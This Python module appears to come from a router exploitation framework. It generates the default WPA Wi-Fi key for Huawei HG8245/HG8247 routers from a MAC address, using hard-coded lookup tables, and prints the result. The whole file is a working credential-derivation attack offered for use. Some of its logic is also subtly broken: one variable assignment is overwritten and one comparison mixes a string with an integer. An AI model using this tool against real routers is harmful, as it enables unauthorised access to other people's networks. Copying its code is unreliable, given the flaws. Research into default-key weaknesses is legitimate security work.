# Name:Huawei HG8245/HG8247 mac2wpakey
# File:hg8245_mac2wpa.py
# Author:Ján Trenčanský
# License: GNU GPL v3
# Created: 18.7.2015
# Last modified: 18.7.2015
# Shodan Dork:
# Description: Generates WPA key for Huawei HG8245/HG8247 based on mac.
# Based on function HG824x() routerpwn.com

import core.Misc
import core.io
from interface.messages import print_success, print_error, print_help, print_info
from interface.utils import validate_mac, lookup_mac


class Misc(core.Misc.RextMisc):
    """
Name:Huawei HG8245/HG8247 mac2wpakey
File:hg8245_mac2wpa.py
Author:Ján Trenčanský
License: GNU GPL v3
Created: 18.7.2015
Description: Generates WPA key for Huawei HG8245/HG8247 based on mac.
Based on: function HG824x() routerpwn.com

Options:
    Name        Description

    mac         MAC address used as input for WPA password generation
    """
    mac = "00:00:00:00:00"

    def __init__(self):
        core.Misc.RextMisc.__init__(self)

    def do_set(self, e):
        args = e.split(' ')
        if args[0] == "mac":
            if validate_mac(args[1]):
                self.mac = args[1]
                print_info("MAC set to: " + self.mac + " " + lookup_mac(self.mac))
            else:
                print_error("please provide valid MAC address")

    def do_mac(self, e):
        print_info(self.mac)

    def help_set(self):
        print_help("Set value of variable: \"set mac 00:11:22:33:44:55\"")

    def help_mac(self):
        print_help("Prints value of variable MAC")

    def do_run(self, e):
        mac = self.mac
        mac = mac.upper()
        mac = mac.replace("-", ":")
        mac = mac.split(":")

        last = mac[0]
        part1 = mac[3]
        part2 = mac[4]
        partx = mac[5]
        #extract = mac[5].split("")
        part3 = mac[5][0]
        offset = mac[5][1]
        integer = int(offset, 16)
        value = int(part3, 16)

        if 0 <= integer <= 8:
            if value == 0:
                val = "F"
            else:
                value -= 1
        val = format(value, 'x')
        val = val.upper()

        if offset == "8":
            part3 = "F"
        elif offset == "C":
            part3 = "3"
        elif offset == "0":
            part3 = "7"
        elif offset == "4":
            part3 = "B"
        elif offset == "9":
            part3 = "0"
        elif offset == "D":
            part3 = "4"
        elif offset == "1":
            part3 = "8"
        elif offset == "5":
            part3 = "C"
        elif offset == "A":
            part3 = "1"
        elif offset == "E":
            part3 = "5"
        elif offset == "2":
            part3 = "9"
        elif offset == "6":
            part3 = "D"
        elif offset == "B":
            part3 = "2"
        elif offset == "F":
            part3 = "6"
        elif offset == "3":
            part3 = "A"
        elif offset == "7":
            part3 = "E"

        if last == "28":
            part4 = "03"
        elif last == "00":
            part4 = "0D"
        elif last == "AC":
            part4 = "1A"
        elif last == "08":
            part4 = "05"
        elif last == "10":
            part4 = "0E"
        elif last == "20":
            part4 = "1F"
        elif last == "80":
            part4 = "06"
        elif last == "CC":
            part4 = "12"
        elif last == "70":
            part4 = "20"
        elif last == "E0":
            part4 = "0C"
        elif last == "D4":
            part4 = "35"
        elif last == "F8":
            part4 = "21"
        elif last == "48":
            part4 = "24"
        else:
            print_error("not possible to generate WPA key from MAC")
            return

        integer = int(partx, 16)
        if 0 <= integer <= 8:
            new_v = int(part2, 16)
            new_value = new_v - 1
            part2 = format(new_value, 'x')
            part2 = part2.upper()
            if val == 0:
                val = "F"
        print_success("WPA key generated")
        print("WPA Key: " + part1 + part2 + val + part3 + part4)

Misc()

